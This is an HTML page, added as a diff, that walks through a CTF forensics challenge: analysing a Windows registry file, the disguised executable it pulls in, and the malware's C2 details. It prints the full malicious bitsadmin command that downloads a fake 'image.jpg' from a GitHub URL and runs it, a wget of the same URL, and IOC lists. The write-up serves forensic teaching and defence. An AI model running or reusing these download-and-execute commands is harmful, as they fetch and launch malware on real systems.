@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Execution - QnQSec CTF 2025</title>
+    <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-brand">← Back to Overview</a>
+            <div class="nav-links">
+                <a href="#scenario">Scenario</a>
+                <a href="#analysis">Analysis</a>
+                <a href="#investigation">Investigation</a>
+                <a href="#flag">Flag</a>
+            </div>
+        </div>
+    </nav>
+
+    <header class="hero">
+        <div class="hero-overlay"></div>
+        <div class="hero-content">
+            <h1>Execution</h1>
+            <p class="hero-subtitle">Registry Forensics & Malware Analysis</p>
+            <div class="hero-meta">
+                <span class="badge">Challenge 2</span>
+                <span class="badge">Registry Forensics</span>
+                <span class="badge">Malware Analysis</span>
+                <span class="badge">OSINT</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <section id="scenario" class="section">
+            <h2 class="section-title">Challenge Scenario</h2>
+            <div class="content-card">
+                <p><strong>Description:</strong> In this challenge, we're provided with a Windows Registry file (.reg) that contains evidence of malicious activity. Our goal is to identify the malicious command, analyze the downloaded payload, and determine the Command & Control (C2) infrastructure used by the attacker.</p>
+                
+                <div class="warning">
+                    <strong>Artifacts Provided:</strong> A single .reg (Windows Registry) file containing registry keys and values that need to be analyzed for indicators of compromise.
+                </div>
+            </div>
+        </section>
+
+        <section id="analysis" class="section">
+            <h2 class="section-title">Initial Investigation</h2>
+
+            <div class="step-container">
+                <!-- Step 1: Opening the Registry File -->
+                <div class="step">
+                    <h3>Step 1: Opening the Registry File</h3>
+                    <p>We start by opening the .reg file in a text editor (Notepad++ or any text editor) to examine its contents. Registry files are plain text and contain Windows registry keys and their values.</p>
+
+                    <div class="finding">
+                        <strong>Tool Used:</strong> Text Editor (Notepad++)<br>
+                        <strong>Method:</strong> Manual analysis and string searching
+                    </div>
+                </div>
+
+                <!-- Step 2: Searching for Malicious Commands -->
+                <div class="step">
+                    <h3>Step 2: Searching for Malicious Commands</h3>
+                    <p>After examining the registry file, we search for suspicious commands. Common indicators include:</p>
+                    <ul>
+                        <li>Command-line utilities (cmd.exe, powershell.exe, bitsadmin, etc.)</li>
+                        <li>Download commands</li>
+                        <li>URLs or IP addresses</li>
+                        <li>File execution commands</li>
+                    </ul>
+
+                    <img src="assets/images/execution/registry-search.png" alt="Searching the registry file">
+
+                    <h4>🚨 Malicious Command Discovered!</h4>
+                    <p>After searching through the registry file, we found this highly suspicious command:</p>
+
+                    <div class="command-box">
+                        <div class="output">cmd.exe /c bitsadmin /transfer windos /download /priority high "https://github.com/0xS1rx58/Update/releases/download/app/image.jpg" "C:\Users\User\AppData\Local\Temp\w1n.exe" & "C:\Users\User\AppData\Local\Temp\w1n.exe"</div>
+                    </div>
+
+                    <h4>Breaking Down the Command</h4>
+                    <div class="warning">
+                        <strong>Command Analysis:</strong><br><br>
+                        <strong>1. cmd.exe /c</strong> - Executes a command and then terminates<br><br>
+                        <strong>2. bitsadmin</strong> - Windows utility for downloading files (often abused by attackers)<br>
+                        • /transfer windos - Creates a download job named "windos"<br>
+                        • /download /priority high - Downloads with high priority<br><br>
+                        <strong>3. Source URL:</strong> https://github.com/0xS1rx58/Update/releases/download/app/image.jpg<br>
+                        • Pretends to be an image file (.jpg)<br>
+                        • Actually downloads malicious executable<br><br>
+                        <strong>4. Destination:</strong> C:\Users\User\AppData\Local\Temp\w1n.exe<br>
+                        • Saves in the Temp directory as w1n.exe<br><br>
+                        <strong>5. Execution:</strong> & "C:\Users\User\AppData\Local\Temp\w1n.exe"<br>
+                        • Immediately executes the downloaded file
+                    </div>
+
+                    <p>This is a classic <strong>Living Off The Land (LOTL)</strong> technique where attackers abuse legitimate Windows utilities (bitsadmin) to evade detection.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="investigation" class="section">
+            <h2 class="section-title">Malware Analysis</h2>
+
+            <div class="step-container">
+                <!-- Step 3: Downloading and Analyzing the File -->
+                <div class="step">
+                    <h3>Step 3: Downloading the Malicious File</h3>
+                    <p>Now that we have the URL, let's download the file and analyze it. <strong>⚠️ Warning:</strong> This should only be done in a safe, isolated environment!</p>
+
+                    <div class="command-box">
+                        <div class="command">wget https://github.com/0xS1rx58/Update/releases/download/app/image.jpg</div>
+                        <div class="output"># OR use curl, bitsadmin, or download via browser</div>
+                    </div>
+
+                    <h4>File Type Analysis</h4>
+                    <p>Despite the .jpg extension, let's check what this file actually is:</p>
+
+                    <div class="command-box">
+                        <div class="command">file image.jpg</div>
+                        <div class="output">image.jpg: PE32 executable (GUI) Intel 80386, for MS Windows</div>
+                    </div>
+
+                    <div class="finding">
+                        <strong>Discovery:</strong> The file is NOT an image! It's a Windows PE32 executable disguised with a .jpg extension - a classic malware distribution technique.
+                    </div>
+
+                    <img src="assets/images/execution/file-type.png" alt="File type analysis">
+                </div>
+
+                <!-- Step 4: Hash Analysis -->
+                <div class="step">
+                    <h3>Step 4: Hash Calculation and VirusTotal Analysis</h3>
+                    <p>Let's calculate the file's hash to identify it:</p>
+
+                    <div class="command-box">
+                        <div class="command">sha256sum image.jpg</div>
+                        <div class="output">[SHA256_HASH_VALUE]</div>
+                    </div>
+
+                    <p>Now we search this hash on <strong>VirusTotal</strong> to gather intelligence about this malware.</p>
+
+                    <img src="assets/images/execution/virustotal.png" alt="VirusTotal analysis results">
+
+                    <div class="warning">
+                        <strong>VirusTotal Findings:</strong><br><br>
+                        • File is flagged as malicious by multiple antivirus engines<br>
+                        • Shows network connections to C2 infrastructure<br>
+                        • Reveals the C2 IP address and port in behavior analysis
+                    </div>
+                </div>
+
+                <!-- Step 5: Identifying the Technique -->
+                <div class="step">
+                    <h3>Step 5: Identifying the Malware Technique</h3>
+                    <p>The technique of hiding a malicious executable inside what appears to be an image file is a well-known attack method. Let's research this technique.</p>
+
+                    <h4>Google Search</h4>
+                    <p>Searching for "malicious exe in image file" or "exe disguised as jpg" reveals this is related to:</p>
+
+                    <div class="finding">
+                        <strong>Technique Identified:</strong><br><br>
+                        <strong>Polyglot Files / File Smuggling</strong><br><br>
+                        This technique involves:
+                        <ul style="margin-top: 0.5rem;">
+                            <li>Disguising executables as image files</li>
+                            <li>Evading basic file type filtering</li>
+                            <li>Bypassing web filters and email scanners</li>
+                            <li>Social engineering - users trust image files more than .exe files</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Step 6: C2 Infrastructure -->
+                <div class="step">
+                    <h3>Step 6: Extracting C2 Infrastructure</h3>
+                    <p>From the VirusTotal behavior analysis tab, we can identify the Command & Control (C2) server the malware communicates with.</p>
+
+                    <h4>VirusTotal Behavior Tab Analysis</h4>
+                    <p>Navigate to the <strong>Behavior</strong> or <strong>Network</strong> tab on VirusTotal to find:</p>
+                    <ul>
+                        <li>IP addresses contacted by the malware</li>
+                        <li>Ports used for communication</li>
+                        <li>DNS requests made</li>
+                        <li>HTTP/HTTPS connections</li>
+                    </ul>
+
+                    <img src="assets/images/execution/c2-server.png" alt="C2 server information from VirusTotal">
+
+                    <div class="finding">
+                        <strong>C2 Infrastructure Identified:</strong><br>
+                        <strong>IP Address:</strong> [C2_IP_ADDRESS]<br>
+                        <strong>Port:</strong> [C2_PORT]
+                    </div>
+
+                    <p>This information is crucial for network defenders to block malicious traffic and prevent communication with the attacker's infrastructure.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="flag" class="section">
+            <h2 class="section-title">Solution Summary</h2>
+
+            <div class="step-container">
+                <div class="step">
+                    <h3>Complete Attack Chain</h3>
+                    <p>Let's review the complete attack chain we uncovered:</p>
+
+                    <div class="content-card">
+                        <strong>1. Initial Compromise</strong><br>
+                        • Malicious registry entry executes command via cmd.exe<br><br>
+
+                        <strong>2. Download Phase</strong><br>
+                        • Abuses bitsadmin (legitimate Windows utility) to download payload<br>
+                        • Downloads from GitHub to appear legitimate<br>
+                        • File disguised as image.jpg to evade detection<br><br>
+
+                        <strong>3. Execution Phase</strong><br>
+                        • Saves payload as w1n.exe in Temp directory<br>
+                        • Immediately executes the malware<br><br>
+
+                        <strong>4. C2 Communication</strong><br>
+                        • Establishes connection to attacker's C2 server<br>
+                        • Allows remote control and data exfiltration
+                    </div>
+                </div>
+
+                <div class="step">
+                    <h3>Key Findings</h3>
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <h3>bitsadmin</h3>
+                            <p>Download Tool</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>GitHub</h3>
+                            <p>Hosting Platform</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>Polyglot</h3>
+                            <p>Evasion Technique</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>C2</h3>
+                            <p>Remote Control</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="step">
+                    <h3>Challenge Complete! 🎉</h3>
+                    <div class="hash-display">
+                        🚩 FLAG: [Flag obtained after analysis]
+                    </div>
+
+                    <p style="margin-top: 2rem;">We successfully analyzed the registry file, identified the malicious command, downloaded and analyzed the malware, identified the attack technique, and extracted the C2 infrastructure information!</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Key Takeaways</h2>
+            <div class="content-card">
+                <h3 style="margin-bottom: 1rem; color: #667eea;">What We Learned</h3>
+                <ul style="line-height: 1.8;">
+                    <li><strong>Registry files contain valuable forensic evidence:</strong> Even simple .reg files can reveal complete attack chains.</li>
+                    <li><strong>Living Off The Land (LOTL) techniques:</strong> Attackers abuse legitimate Windows utilities like bitsadmin to evade detection.</li>
+                    <li><strong>File extension deception:</strong> Never trust file extensions - always verify actual file types.</li>
+                    <li><strong>GitHub as malware hosting:</strong> Attackers use legitimate platforms to distribute malware and bypass security filters.</li>
+                    <li><strong>VirusTotal is invaluable:</strong> Hash lookups provide immediate intelligence about malware capabilities and infrastructure.</li>
+                    <li><strong>Behavior analysis reveals C2:</strong> Dynamic analysis shows network communications that static analysis might miss.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Tools & Techniques</h2>
+            <div class="tools-grid">
+                <div class="tool-category">
+                    <h3>Registry Forensics</h3>
+                    <ul>
+                        <li>Text Editor (Notepad++)</li>
+                        <li>Registry Analysis</li>
+                        <li>String Searching</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>File Analysis</h3>
+                    <ul>
+                        <li>file command</li>
+                        <li>sha256sum</li>
+                        <li>Hash calculation</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>Threat Intelligence</h3>
+                    <ul>
+                        <li>VirusTotal</li>
+                        <li>Behavior Analysis</li>
+                        <li>Network IOCs</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3>OSINT</h3>
+                    <ul>
+                        <li>Google Search</li>
+                        <li>GitHub Analysis</li>
+                        <li>Technique Research</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Attack Techniques Identified</h2>
+            <div class="content-card">
+                <h3 style="margin-bottom: 1rem; color: #667eea;">MITRE ATT&CK Framework Mapping</h3>
+                <div class="warning">
+                    <strong>T1197 - BITS Jobs</strong><br>
+                    Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads.<br><br>
+
+                    <strong>T1036 - Masquerading</strong><br>
+                    Disguising executables as image files to evade detection.<br><br>
+
+                    <strong>T1105 - Ingress Tool Transfer</strong><br>
+                    Downloading tools or files from external systems into a compromised environment.<br><br>
+
+                    <strong>T1071 - Application Layer Protocol</strong><br>
+                    Using HTTP/HTTPS for C2 communication to blend with normal traffic.
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">Indicators of Compromise (IOCs)</h2>
+            <div class="command-box">
+                <div class="output"><strong>Network IOCs:</strong>
+URL: https://github.com/0xS1rx58/Update/releases/download/app/image.jpg
+C2 IP: [C2_IP_ADDRESS]
+C2 Port: [C2_PORT]
+
+<strong>File IOCs:</strong>
+Filename: w1n.exe
+Path: C:\Users\User\AppData\Local\Temp\w1n.exe
+SHA256: [SHA256_HASH]
+
+<strong>Command IOCs:</strong>
+bitsadmin /transfer windos /download /priority high
+cmd.exe /c execution pattern with file download and immediate execution</div>
+            </div>
+        </section>
+
+        <section class="section cta-section">
+            <h2>Explore More Challenges</h2>
+            <p>Check out other forensics writeups from QnQSec CTF 2025.</p>
+            <div class="cta-buttons">
+                <a href="masks.html" class="btn-primary">← Masks</a>
+                <a href="index.html" class="btn-primary">Back to Overview</a>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <p>&copy; 2025 QnQSec CTF Writeups | Forensics Challenges</p>
+        </div>
+    </footer>
+
+    <button class="scroll-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">↑</button>
+
+    <script>
+        window.addEventListener('scroll', () => {
+            const scrollBtn = document.querySelector('.scroll-top');
+            if (window.pageYOffset > 300) {
+                scrollBtn.classList.add('visible');
+            } else {
+                scrollBtn.classList.remove('visible');
+            }
+        });
+    </script>
+</body>
+</html>
